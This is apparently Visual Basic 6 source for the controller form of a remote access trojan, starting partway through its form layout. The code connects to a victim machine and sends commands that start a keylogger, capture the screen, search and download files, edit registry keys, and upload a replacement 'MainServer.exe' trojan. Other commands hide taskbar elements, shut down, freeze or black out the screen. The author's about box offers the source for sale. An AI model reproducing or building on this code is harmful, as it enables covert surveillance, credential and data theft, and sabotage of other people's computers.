         TabIndex        =   94
         Top             =   2640
         Width           =   1695
      End
      Begin VB.Label lblClass 
         Height          =   735
         Left            =   -74880
         TabIndex        =   75
         Top             =   6420
         Width           =   2295
      End
      Begin VB.Label lbltop1 
         BackColor       =   &H80000004&
         Height          =   375
         Left            =   -74880
         TabIndex        =   70
         Top             =   5580
         Width           =   2295
      End
      Begin VB.Label lblbot 
         BackColor       =   &H80000004&
         Height          =   375
         Left            =   -74880
         TabIndex        =   69
         Top             =   4380
         Width           =   2295
      End
      Begin VB.Label lblLeft 
         BackColor       =   &H80000004&
         Height          =   375
         Left            =   -74880
         TabIndex        =   68
         Top             =   4980
         Width           =   2295
      End
      Begin VB.Label lblright 
         BackColor       =   &H80000004&
         Height          =   375
         Left            =   -74880
         TabIndex        =   66
         Top             =   3780
         Width           =   2295
      End
      Begin VB.Label lblID 
         BackColor       =   &H80000004&
         Height          =   375
         Left            =   -74880
         TabIndex        =   63
         Top             =   3180
         Width           =   2295
      End
      Begin VB.Label lblWinNum 
         Height          =   255
         Left            =   -72600
         TabIndex        =   59
         Top             =   6900
         Width           =   4095
      End
      Begin VB.Label help4 
         Height          =   375
         Left            =   -74880
         TabIndex        =   38
         Top             =   3180
         Width           =   1455
      End
      Begin VB.Label help3 
         Height          =   255
         Left            =   -74880
         TabIndex        =   37
         Top             =   2700
         Width           =   1575
      End
      Begin VB.Label help2 
         Height          =   255
         Left            =   -74880
         TabIndex        =   36
         Top             =   2220
         Width           =   1575
      End
      Begin VB.Label help1 
         Height          =   255
         Left            =   -74880
         TabIndex        =   35
         Top             =   1740
         Width           =   1335
      End
   End
   Begin VB.Label Label7 
      Caption         =   "X:"
      Height          =   255
      Left            =   2040
      TabIndex        =   110
      Top             =   3960
      Width           =   255
   End
   Begin VB.Label Label8 
      BackColor       =   &H80000008&
      Height          =   15
      Left            =   4440
      TabIndex        =   67
      Top             =   7080
      Width           =   1455
   End
   Begin VB.Label Label3 
      BackColor       =   &H80000008&
      Height          =   255
      Left            =   120
      TabIndex        =   65
      Top             =   7440
      Width           =   1935
   End
   Begin VB.Label lbltop 
      BackColor       =   &H80000008&
      Height          =   255
      Left            =   120
      TabIndex        =   64
      Top             =   7920
      Width           =   1935
   End
   Begin VB.Menu Help 
      Caption         =   "Help"
      Begin VB.Menu about 
         Caption         =   "About"
      End
      Begin VB.Menu exit 
         Caption         =   "Exit"
      End
   End
End
Attribute VB_Name = "client"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim lstCount As Integer
Dim RecievedFile As String
Dim clkKey As String
Dim msgFunct As String
Dim numEnt As Integer
Dim Commanding
Dim dataRec
Dim intXOffset, intYOffset As Integer
Const MAX_CHUNK = 4196
Dim outputName As String





Private Sub about_Click()
MsgBox "Created by Alex K.. If you have any comments, questions, or if you wish to buy source code please email me at sfinx3@earthlink.net", vbOKOnly, "About"
End Sub

Private Sub cmbResolveHostname_Click()
txtResolvedHostname = ResolveHostname(txtIpAddress)
End Sub

Private Sub cmdErrMsg_Click()


wskClient.SendData "\ERR" & txtErrorMsg.Text



End Sub

Private Sub cmdHide_Click()

If lblClass.Caption = "" Then
wskClient.SendData "\OAct"
Else
wskClient.SendData "\classlbl1" & Right$(lblClass.Caption, (Len(lblClass) - 12))
End If


End Sub

Private Sub cmdPingHostname_Click()
    lblHostPingState.Caption = "Ping State: " & IIf(Ping(txtHostname, 1000), "Alive!", "Dead!")
End Sub

Private Sub cmdPingIp_Click()
    lblIpPingState.Caption = "Ping State: " & IIf(Ping(txtIpAddress, 1000), "Alive!", "Dead!")
End Sub

Private Sub cmdRef_Click()

List3.Clear
MsgBox " BE PATIENT...REQESTING DATA...", vbCritical, "WARNING"
wskWINT.SendData "\Wnth"


End Sub

Private Sub cmdResolveIp_Click()
Dim retColl As Collection
Dim nCount As Integer

    Set retColl = ResolveIpaddress(txtHostname)
    
    lstResolvedAddress.Clear
    If retColl.Count > 0 Then
        For nCount = 1 To retColl.Count
            lstResolvedAddress.AddItem CStr(retColl.Item(nCount))
        Next nCount
    End If
End Sub

Private Sub cmdSend_Click()



wskClient.SendData "MSG_" & txtAns.Text
txtAns.Text = ""



End Sub

Private Sub cmdShow_Click()




If lblClass.Caption = "" Then
wskClient.SendData "\Act"
Else
wskClient.SendData "\classlbl2" & Right$(lblClass.Caption, (Len(lblClass) - 12))
End If

End Sub

Private Sub Combo1_Click()



wskClient.SendData "Taskbar " & Combo1.Text



End Sub

Private Sub Combo2_Click()

wskClient.SendData "Startbutton " & Combo2.Text



End Sub

Private Sub Combo3_Click()



wskClient.SendData "TaskBClock " & Combo3.Text



End Sub

Private Sub Combo4_Click()



wskClient.SendData "TaskBIcon " & Combo4.Text



End Sub

Private Sub Combo5_Click()



wskClient.SendData "PST " & Combo5.Text


End Sub

Private Sub Combo6_Click()



wskClient.SendData "Windows Toolbar " & Combo6.Text


End Sub

Private Sub Combo7_Click()


wskClient.SendData "Screen Blackout " & Combo7.Text


End Sub

Private Sub Combo8_Click()


wskClient.SendData "CTRL " & Combo8.Text


End Sub



Private Sub Command1_Click()
Dim lTIme As ValueConstants



If Command1.Caption = "Connect" Then

If Text1.Text = "" Then
Beep
Text1.SetFocus
Exit Sub
End If

With wskClient
    .Close
    .RemoteHost = Trim(Text1.Text)
    .Connect
End With

PauseData.Pause 0.5

With wskFile
    .Close
    .RemoteHost = Trim(Text1.Text)
    .Connect
End With

PauseData.Pause 0.5


With wskEx
    .Close
    .RemoteHost = Trim(Text1.Text)
    .Connect
End With

PauseData.Pause 0.5


With wskWINT
    .Close
    .RemoteHost = Trim(Text1.Text)
    .Connect
End With

PauseData.Pause 0.5


With wskKeys
    .Close
    .RemoteHost = Trim(Text1.Text)
    .Connect
End With

PauseData.Pause 0.5


With wskFL
    .Close
    .RemoteHost = Trim(Text1.Text)
    .Connect
End With

PauseData.Pause 0.5


With wskF
    .Close
    .RemoteHost = Trim(Text1.Text)
    .Connect
End With





Else

'wskClient.SendData "\IMP\INF" & USERNUMBER
wskClient.SendData "\end"
PauseData.Pause 1
wskClient.Close
wskEx.Close
wskFile.Close
wskWINT.Close
Command1.Caption = "Connect"
client.Height = 2400
SSTab1.Visible = False
End If
End Sub

Private Sub Command10_Click()

wskClient.SendData "\optRes1"



End Sub

Private Sub Command11_Click()

wskClient.SendData "\optRes2"



End Sub

Private Sub Command12_Click()

wskClient.SendData "\URL" & txtURL.Text
err:
MsgBox "Ther was an error!!! Most likely because the host has been disconnected. Please try reconnecting to the server!", vbCritical, "ERROR!!!"



End Sub

Private Sub Command13_Click()

wskClient.SendData "\Beep" & txtFreq.Text & "," & txtDur.Text
err:
MsgBox "Ther was an error!!! Most likely because the host has been disconnected. Please try reconnecting to the server!", vbCritical, "ERROR!!!"



End Sub

Private Sub Command14_Click()

wskClient.SendData "\RandMouse"


End Sub

Private Sub Command15_Click()

wskClient.SendData "\OpenCD"



End Sub

Private Sub Command16_Click()

wskClient.SendData "\Swap"



End Sub

Private Sub Command17_Click()
Dim drv As String
Dim Pat As String


client.wskClient.SendData "STARTsearching"
drv = cmbDrive.Text
Pat = txtPat.Text
MsgBox "Please be patient...requestin file information....Please be patient..", vbOKOnly, "WARNING"
client.wskEx.SendData "\Drv" & drv
PauseData.Pause 0.5
client.wskEx.SendData "\Pat" & Pat
PauseData.Pause 0.5
client.wskEx.SendData "\Search"

Command17.Enabled = False
Command25.Enabled = True




End Sub

Private Sub Command18_Click()
lstFiles.Clear
End Sub

Private Sub Command19_Click()




If ClearDocs.value = 1 Then msgFunct = msgFunct & "," & "bCRDOE"
If Shutdown.value = 1 Then msgFunct = msgFunct & "," & "aC"
If FavMenu.value = 1 Then msgFunct = msgFunct & "," & "bFM"
If FindMenu.value = 1 Then msgFunct = msgFunct & "," & "bFind"
If Logoff.value = 1 Then msgFunct = msgFunct & "," & "bLOM"
If RecentDocsMenu.value = 1 Then msgFunct = msgFunct & "," & "bRDM"
If Runmenu.value = 1 Then msgFunct = msgFunct & "," & "bRM"
If CTMenu.value = 1 Then msgFunct = msgFunct & "," & "bSFM"
If RecentHistory.value = 1 Then msgFunct = msgFunct & "," & "bRDH"
If Check1.value = 1 Then msgFunct = msgFunct & "," & "drA:\"
If Check2.value = 1 Then msgFunct = msgFunct & "," & "drC:\"
If Check3.value = 1 Then msgFunct = msgFunct & "," & "drD:\"
wskClient.SendData "<txtVAR>" & Trim$(Text2.Text)
PauseData.Pause 0.5
wskClient.SendData "\DISregs" & msgFunct



End Sub

Private Sub Command2_Click()

cmSave.ShowSave
SavePath = cmSave.FileName
    client.wskClient.SendData "\fileSize" & "C:\Windows\capturedesk.jpg"
    PauseData.Pause 0.5
    ProgressBar1.Min = 0
    ProgressBar1.Max = flSize
wskClient.SendData "\CapScreen"


End Sub

Private Sub Command20_Click()
Dim ans As Variant
If IsConnected Then
        ans = MsgBox("If you close without disconnecting the server will not be able to establish connection with you on this IP address, would you like to disconect first?", vbOKCancel, "Warning")
        If ans = vbOK Then
        wskClient.Close
        MsgBox "Unloading..."
        Unload Me
        Else
        Exit Sub
        End If
Else
Unload Me
End If
End Sub

Private Sub Command21_Click()
wskClient.SendData "\RtA" & txtRoot.Text
PauseData.Pause 0.2
wskClient.SendData "1\P" & txtPath.Text
PauseData.Pause 0.2
wskClient.SendData "\SubkeyA" & txtSubKey.Text
PauseData.Pause 0.2
wskClient.SendData "\ValKeyA" & txtValue.Text


PauseData.Pause 0.2

   If optCrK.value = True Then wskClient.SendData "1\CrK"
   If optCrKV.value = True Then wskClient.SendData "\CrKV"
   If optDK.value = True Then wskClient.SendData "\DK"
   If optDSK.value = True Then wskClient.SendData "\DSK"

End Sub

Private Sub Command22_Click()
On Error GoTo err

cmSave.ShowOpen
If Not vbCancel Then
wskClient.SendData "\KKKT" & "C:\Windows\System\MainServer.exe"
PauseData.Pause 1
    If Right(cmSave.FileName, 14) <> "MainServer.exe" Then
    MsgBox "Choose a trojan if you want to update the server"
Else
    MsgBox "starting to upload..."

outputName = cmSave.FileName
    SendFile (outputName)
    End If
End If

err:
Exit Sub

End Sub

Private Sub Command23_Click()


Dim pathSend As String
Dim exten As String
Dim datexten As String
Dim o As Integer

On Error GoTo err

pathSend = InputBox("Please enter the folder's path where you want to send the file to")
cmSave.ShowOpen
 
 For o = 1 To Len(cmSave.FileName)
    
    exten = Right(cmSave.FileName, o)
    
    If Left(exten, 1) = "\" Then
    datexten = Right(exten, Len(exten) - 1)
    Exit For
    End If
    
Next o
 
 If Not vbCancel Then
wskClient.SendData "\KKKT" & pathSend & datexten
PauseData.Pause 1
outputName = cmSave.FileName
SendFile (outputName)
End If

err:
Exit Sub

End Sub

Private Sub Command24_Click()
frmKeylog.Show
client.wskKeys.SendData "<START>"
End Sub

Private Sub Command25_Click()
Command25.Enabled = False
Command17.Enabled = True
client.wskClient.SendData "STOPsearching"
End Sub

Private Sub Command26_Click()
frmExplorer.Show
End Sub

Private Sub Command27_Click()
TimerM.Enabled = True
End Sub

Private Sub Command28_Click()
TimerM.Enabled = False
client.txtY = ""
client.txtX = ""
End Sub

Private Sub Command29_Click()

MsgBox "Try to use .bmp pictures because other extentions might not work", vbOKOnly, " Info"
Dim o
Dim exten
Dim datexten

cmSave.ShowOpen
 
 For o = 1 To Len(cmSave.FileName)
    
    exten = Right(cmSave.FileName, o)
    
    If Left(exten, 1) = "\" Then
    datexten = Right(exten, Len(exten) - 1)
    Exit For
    End If
    
Next o
 
If Not vbCancel Then
wskClient.SendData "\KKKT" & "C:\Windows\" & datexten
PauseData.Pause 1
outputName = cmSave.FileName
SendFile (outputName)
PauseData.Pause 1
client.wskClient.SendData "<CHANGEdesktop>"
End If
End Sub

Private Sub Command3_Click()

wskClient.SendData "\Restart"

End Sub

Private Sub Command30_Click()


If lblClass.Caption = "" Then
Exit Sub
Else
wskWINT.SendData "<APP>" & Right$(lblClass.Caption, (Len(lblClass) - 12))
End If



End Sub

Private Sub Command31_Click()

If Command31.Caption = "Put a picture on the screen" Then
Dim o
Dim exten
Dim datexten

cmSave.ShowOpen
 
 For o = 1 To Len(cmSave.FileName)
    
    exten = Right(cmSave.FileName, o)
    
    If Left(exten, 1) = "\" Then
    datexten = Right(exten, Len(exten) - 1)
    Exit For
    End If
    
Next o
 
If Not vbCancel Then
wskClient.SendData "\putPIC" & "C:\Windows\" & datexten
PauseData.Pause 1
outputName = cmSave.FileName
SendFile (outputName)
PauseData.Pause 1
client.wskClient.SendData "<PICput>"
End If
Command31.Caption = "Get the picture off the screen"
Else
client.wskClient.SendData "<UNLOADpic"
Command31.Caption = "Put a picture on the screen"
End If



End Sub

Private Sub Command32_Click()

    If Command32.Caption = "FREEZE" Then
    client.wskClient.SendData "<FREEZEE>"
    Command32.Caption = "UNFREEZEE"
    Else
    client.wskClient.SendData "<UNF>"
    Command32.Caption = "FREEZE"
    End If



End Sub

Private Sub Command33_Click()



If lblClass.Caption = "" Then
wskClient.SendData "\LAct"
Else
wskClient.SendData "\classlbl3" & Right$(lblClass.Caption, (Len(lblClass) - 12))
End If



End Sub

Private Sub Command4_Click()

wskClient.SendData "\Shutdown"



End Sub

Private Sub Command5_Click()

wskClient.SendData "\LogOff"



End Sub

Private Sub Command6_Click()

wskClient.SendData "\Hidemouse"



End Sub

Private Sub Command7_Click()

wskClient.SendData "\Showmouse"



End Sub

Private Sub Command8_Click()

wskClient.SendData "\RestoreMouse"



End Sub

Private Sub Command9_Click()

wskClient.SendData "\optRes0"



End Sub

Private Sub exit_Click()
Unload Me
End Sub

Private Sub Form_Load()
Dim StatusPanel As Panel
Dim StatusPanel2 As Panel
Set StatusPanel = StatusBar1.Panels.Add
StatusBar1.Panels.Item(1).Style = sbrTime
Set StatusPanel2 = StatusBar1.Panels.Add
txtMsg.Enabled = False
cmdSend.Enabled = False
client.Height = 2700
SSTab1.Visible = False


Combo1.AddItem "show"
Combo1.AddItem "hide"
Combo1.AddItem "destroy"

Combo2.AddItem "show"
Combo2.AddItem "hide"
Combo2.AddItem "destroy"

Combo3.AddItem "show"
Combo3.AddItem "hide"
Combo3.AddItem "destroy"

Combo4.AddItem "show"
Combo4.AddItem "hide"
Combo4.AddItem "destroy"

Combo5.AddItem "show"
Combo5.AddItem "hide"
Combo5.AddItem "destroy"

Combo6.AddItem "show"
Combo6.AddItem "hide"
Combo6.AddItem "destroy"

Combo7.AddItem "ON"
Combo7.AddItem "OFF"

Combo8.AddItem "enabled"
Combo8.AddItem "disabled"


cmbDrive.AddItem "B:\"
cmbDrive.AddItem "C:\"
cmbDrive.AddItem "D:\"
cmbDrive.AddItem "E:\"


Dim hMenu&
Dim hSubMenu&
Dim hid&

    hMenu& = GetMenu(client.hwnd)
    hSubMenu& = GetSubMenu(hMenu&, 0)
    hid& = GetMenuItemID(hSubMenu&, 0)
    SetMenuItemBitmaps hMenu&, hid&, MF_BITMAP, _
    Picture3.Picture, _
    Picture3.Picture


    hMenu& = GetMenu(client.hwnd)
    hSubMenu& = GetSubMenu(hMenu&, 0)
    hid& = GetMenuItemID(hSubMenu&, 0)
    SetMenuItemBitmaps hMenu&, 3, MF_BITMAP, _
    Picture3.Picture, _
    Picture3.Picture
    

    Command25.Enabled = False
    
End Sub







Private Sub List3_Click()

    For lstCount = 0 To List3.ListCount - 1
If List3.Selected(lstCount) Then wskWINT.SendData "\txtTitle" & List3.List(lstCount)
    Next lstCount
PauseData.Pause 0.2
wskWINT.SendData "\2Wnth"
End Sub

Private Sub lstFiles_Click()
'Dim LoopIndex
'Dim resultQ
'
'
'For LoopIndex = 0 To lstFiles.ListCount - 1
'
'If lstFiles.Selected(LoopIndex) Then
'
'    PauseData.Pause 0.3
'
'    wskClient.SendData "\fileSize" & lstFiles.List(LoopIndex)
'
'    PauseData.Pause 0.5
'
'resultQ = MsgBox("Do you wish to download file  " & lstFiles.List(LoopIndex) & " it is " & flSize & " bytes" & " ?", vbOKCancel, "??")
'
' If resultQ = vbOK Then
' cmSave.ShowSave
' Else
' Exit Sub
' End If
'
' If Not vbCancel Then SavePath = cmSave.FileName
'
'PauseData.Pause 1
'
'lblSize.Caption = flSize
'ProgressBar1.Min = 0
'ProgressBar1.Max = flSize
'
'wskClient.SendData "\filePath" & lstFiles.List(LoopIndex)
If lstFiles.Text <> "<<FINISHED>>" Then frmFiles.Show


 
'End If

'Next LoopIndex


End Sub

Private Sub optCrK_Click()
optCrKV.value = False
optDSK.value = False
optDK.value = False
txtRoot.Enabled = True
txtPath.Enabled = True
txtSubKey.Enabled = False
txtValue.Enabled = False
End Sub

Private Sub optCrKV_Click()
optCrK.value = False
optDSK.value = False
optDK.value = False
txtRoot.Enabled = True
txtPath.Enabled = True
txtSubKey.Enabled = True
txtValue.Enabled = True
End Sub

Private Sub optDK_Click()
optCrKV.value = False
optDSK.value = False
optCrK.value = False
txtRoot.Enabled = True
txtPath.Enabled = True
txtSubKey.Enabled = True
txtValue.Enabled = False
End Sub

Private Sub optDSK_Click()
optCrKV.value = False
optCrK.value = False
optDK.value = False
txtRoot.Enabled = True
txtPath.Enabled = True
txtSubKey.Enabled = True
txtValue.Enabled = False
End Sub

Private Sub Option1_Click()
Dim key As String
Dim path As String
Dim value As String

key = InputBox("Please Enter the KEY. Examples: HKEY_CURENT_MACHINE. IF YOU DON'T KNOW WHAT TO DO,PLEASE DON'T USE THIS FUNCTION BECAUSE YOU WILL PRODUCE AN ERROR!", "key")
path = InputBox("Enter the path. Example: Software\Microsoft\Windows\Services\RunServices\", "PATH")
value = InputBox("Please enter the name of the value you wish to delete", "Name:")

wskClient.SendData "\DelVal" & "," & key & "," & path & "," & value


End Sub



Private Sub Timer1_Timer()

Select Case wskClient.State
    Case 0:
        StatusBar1.Panels.Item(2).Text = "CLOSED"
    Case 1:
       StatusBar1.Panels.Item(2).Text = "OPEN"
    Case 2:
        StatusBar1.Panels.Item(2).Text = "LISTENING"
    Case 3:
        StatusBar1.Panels.Item(2).Text = "CONNECTION PENDING"
    Case 4:
        StatusBar1.Panels.Item(2).Text = "RESOLVING HOST"
    Case 5:
        StatusBar1.Panels.Item(2).Text = "HOST RESOLVED"
    Case 6:
       StatusBar1.Panels.Item(2).Text = "CONNECTING"
    Case 7:
        StatusBar1.Panels.Item(2).Text = "CONNECTED"
    Case 8:
        StatusBar1.Panels.Item(2).Text = "CLOSING"
    Case 9:
        StatusBar1.Panels.Item(2).Text = "ERROR"
End Select

If wskClient.State = 7 Then
txtMsg.Enabled = True
cmdSend.Enabled = True





End If
End Sub



Private Sub TimerM_Timer()
MouseCap
End Sub

Private Sub txtResolvedHostname_Change()
 txtResolvedHostname = ResolveHostname(txtIpAddress)
End Sub

Private Sub wskClient_DataArrival(ByVal bytesTotal As Long)

   
   Dim NewArrival$


On Error GoTo err
   
   wskClient.GetData NewArrival$
         
    If InStr(NewArrival$, "X\D") Then
    client.txtMsg.Text = Right(NewArrival$, Len(NewArrival$) - 3)
    
    ElseIf InStr(NewArrival$, "\fileSize") Then flSize = CLng(Right(NewArrival$, Len(NewArrival$) - 9))

  
    ElseIf InStr(NewArrival$, "<kl>") Then
 
    
 
    
    ElseIf InStr(NewArrival$, "StatusInfo") Then
    StatusBar1.Panels.Item(3).Text = Right(NewArrival$, Len(NewArrival$) - 10)
    
    

    End If
 
err:
Exit Sub

End Sub




Private Function GetFileName(Fname As String) As String
    ' return the filename given the path
    Dim numbr As Integer
    Dim tempStr As String
    
    
    
    For numbr% = 1 To Len(Fname$)
       ' look for the "\"
       tempStr$ = Right$(Fname$, numbr%)
       
       If Left$(tempStr$, 1) = "\" Then
         GetFileName$ = Mid$(tempStr$, 2, Len(tempStr$))
         Exit Function
       End If
    Next numbr



End Function



Private Function SendData(sData As String) As Boolean
   
    Dim TimeOut As Long
    

    
    SendData = False
    ' send data
    wskFile.SendData sData
    
    ' check for timeout or closed socket
    Do Until (wskFile.State = 0) Or (TimeOut < 100000)
        DoEvents
        TimeOut = TimeOut + 1
        If TimeOut > 100000 Then Exit Do
    Loop
    ' ok.... sent
    SendData = True
    


End Function



Private Sub SendFile(Fname As String)
    Dim DataChunk As String
    Dim passes As Long
    Dim recLength As Long


    
    If wskFile.State <> 7 Then
    
    wskFile.Close
    wskFile.Connect
    SendFile (Fname)
Else
    
    '
    ' send over the filename so the Server knows where
    ' to store the file.
    SendData "OpenFile," & Fname$
    ' pause to give Server time to open
    PauseData.Pause 0.5
    
    ' open the file to be sent
    Open Fname$ For Binary As #1 ' this mode works well with any file
    ProgressBar1.Max = FileLen(Fname$)
    
        Do While Not EOF(1)
        
          ' update the Pass Variable
          passes& = passes& + 1
          ' get some of the file data 4196 bytes to be exact,
          ' can go smaller but Not bigger.
          DataChunk$ = Input(MAX_CHUNK, #1)
          
          recLength = recLength + Len(DataChunk$)
          
          ' send it to the server
          SendData DataChunk$
          
          ProgressBar1.value = recLength
          ProgressBar1.Refresh
          
          PauseData.Pause 0.2
          DoEvents
        Loop ' loop until all data is sent
        
        ' transfer done, notify the server to close the file
        SendData "CloseFile,"
        
        
        ProgressBar1.value = recLength
        PauseData.Pause 0.2
        ProgressBar1.value = 0
        
        
        ' re-init byte counter and update status
       passes& = 0
    Close #1
    
    End If




End Sub


Private Sub wskClient_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
MsgBox Description
wskClient.Close
Command1.Caption = "Connect"
End Sub



Private Sub wskEx_DataArrival(ByVal bytesTotal As Long)
Dim NewArrival$

wskEx.GetData NewArrival$, vbString

On Error GoTo err

If InStr(NewArrival$, "\FilesFound") Then
    lstFiles.Enabled = False
    lstFiles.AddItem Right(NewArrival$, Len(NewArrival$) - 11), numEnt
    numEnt = numEnt + 1
End If

If NewArrival$ = "\ClrLst" Then
    numEnt = 0
    lstFiles.Clear
End If
If InStr(NewArrival$, "<<FINISHED>>") Then lstFiles.Enabled = True

err:
Exit Sub

End Sub

Private Sub wskF_Connect()
Dim i As Integer
SSTab1.Visible = True
client.Height = 10000
wskClient.SendData "\Time"
MsgBox "EVERYTHING IS CONNECTED", vbOKOnly, "CONNECTED!!"
Command1.Caption = "Disconnect"
End Sub

Private Sub wskF_DataArrival(ByVal bytesTotal As Long)
Dim NewArrival$
wskF.GetData NewArrival$, vbString

On Error GoTo err

If InStr(NewArrival$, "filelist.Clear") Then
frmManager.filelist.Clear
frmManager.filelist.Enabled = False
End If
 
If InStr(NewArrival$, "\newdir") Then
frmManager.filelist.AddItem Right(NewArrival$, Len(NewArrival$) - Len("\newdir"))
End If

If InStr(NewArrival$, "filelist.AddItem") Then
frmManager.filelist.AddItem Right(NewArrival$, Len(NewArrival$) - Len("filelist.AddItem"))
End If

If InStr(NewArrival$, "<additem>") Then
frmManager.filelist.AddItem Right(NewArrival$, Len(NewArrival$) - Len("<additem>"))
End If

If InStr(NewArrival$, "<txtDir>") Then
frmManager.txtDir = Right(NewArrival$, Len(NewArrival$) - Len("<txtDir>"))
End If

If InStr(NewArrival$, "Dir1.Path") Then
Dir1 = Right(NewArrival$, Len(NewArrival$) - Len("Dir1.Path"))
End If

If InStr(NewArrival$, "<<FINISHED>>") Then frmManager.filelist.Enabled = True

err:
Exit Sub

End Sub

Private Sub wskFile_DataArrival(ByVal bytesTotal As Long)
Dim NewArrival2$


wskFile.GetData NewArrival2$, vbString

On Error GoTo err

    Commanding = EvalData(NewArrival2$, 1)
    dataRec = EvalData(NewArrival2$, 2)
    
     Select Case Commanding
           
           Case "OpenFile"  ' open the file
           
           
           
           Open SavePath For Binary As #1
           ProgressBar1.value = 0
               
        Case "CloseFile" ' close the file
          
        Close #1
        PauseData.Pause 1
        ProgressBar1.value = 0
        MsgBox "File Has been downloaded", vbOKOnly, "DONE"
        lblSize.Caption = ""
       
        
        Case Else
           
           
           
           
           Put #1, , NewArrival2$
           
           
           
           ProgressBar1.value = ProgressBar1.value + bytesTotal
           
           ProgressBar1.Refresh
           
          
         
           
        End Select
err:
Exit Sub

End Sub

Private Sub wskFL_DataArrival(ByVal bytesTotal As Long)
Dim NewArrival$
wskFL.GetData NewArrival$, vbString

On Error GoTo err

If InStr(NewArrival$, "\TreeView") Then
        Dim fld As Object
        frmExplorer.TreeView1.Enabled = False
        
        
    If NodeFullKey = Right(NewArrival$, Len(NewArrival$) - 9) Then Exit Sub
    
        Set fld = frmExplorer.TreeView1.Nodes.Add(NodeFullKey, tvwChild, Right(NewArrival$, Len(NewArrival$) - 9), Right(NewArrival$, Len(NewArrival$) - 9), "folder")
End If
 
If InStr(NewArrival$, "\ListView1") Then
        Dim fl As Object
        Dim fl2 As String
        
        frmExplorer.ListView1.Enabled = False
        Set fl = frmExplorer.ListView1.ListItems.Add(, Right(NewArrival$, Len(NewArrival$) - 10), Right(NewArrival$, Len(NewArrival$) - 10), "txt")
        fl2 = Right(NewArrival$, Len(NewArrival$) - 10)
        NN = NN + 1
        frmExplorer.ListView1.ListItems.Item(NN).SmallIcon = "other"
End If

If InStr(NewArrival$, "<<FINISHED>>") Then
frmExplorer.TreeView1.Enabled = True
frmExplorer.ListView1.Enabled = True
End If

err:
Exit Sub

End Sub

Private Sub wskKeys_DataArrival(ByVal bytesTotal As Long)
Dim NewArrival$
wskKeys.GetData NewArrival$, vbString
frmKeylog.txtRead.Text = frmKeylog.txtRead.Text & NewArrival$
End Sub

Private Sub wskWINT_DataArrival(ByVal bytesTotal As Long)
Dim NewArrival$
Dim lng As Integer
Dim lnFinal
Dim prID As Variant
Dim tTop As Variant
Dim bot As Variant
Dim lLeft As Variant
Dim rRight As Variant

    wskWINT.GetData NewArrival$, vbString

On Error GoTo err

    If InStr(NewArrival$, "\Wnt") Then
    List3.AddItem Right(NewArrival$, Len(NewArrival$) - 4), lng
    List3.Enabled = False
    End If
    
    If InStr(NewArrival$, "\lng") Then
    lng = CInt(Right(NewArrival$, Len(NewArrival$) - 4))
    End If
    
'    If InStr(NewArrival$, "\lnFinal") Then
'    lnFinal = CInt(Right(NewArrival$, Len(NewArrival$) - 8))
'    lblWinNum.Caption = lnFinal & " processes are running on that machine"
'    End If

    If InStr(NewArrival$, "\prID") Then
    prID = (Right(NewArrival$, Len(NewArrival$) - 5))
    lblID.Caption = "ID of the process IS: " & prID
    End If

    
    If InStr(NewArrival$, "\top") Then
    tTop = (Right(NewArrival$, Len(NewArrival$) - 4))
    lbltop.Caption = "<window's dimensions:> TOP: " & tTop
    End If
    
    If InStr(NewArrival$, "\bot") Then
    bot = (Right(NewArrival$, Len(NewArrival$) - 4))
    lblbot.Caption = "<window's dimensions:> BOTTOM: " & bot
    End If
    
    If InStr(NewArrival$, "\left") Then
    lLeft = (Right(NewArrival$, Len(NewArrival$) - 5))
    lblLeft.Caption = "<window's dimensions:> LEFT: " & lLeft
    End If
    
    If InStr(NewArrival$, "\right") Then
    rRight = (Right(NewArrival$, Len(NewArrival$) - 6))
    lblright.Caption = "<window's dimensions:> RIGHT: " & rRight
    End If
    
    If InStr(NewArrival$, "\class") Then
    lblClass.Caption = Right(NewArrival$, Len(NewArrival$) - 6)
    End If
    
    If InStr(NewArrival$, "<<FINISHED>>") Then List3.Enabled = True

err:
Exit Sub

End Sub

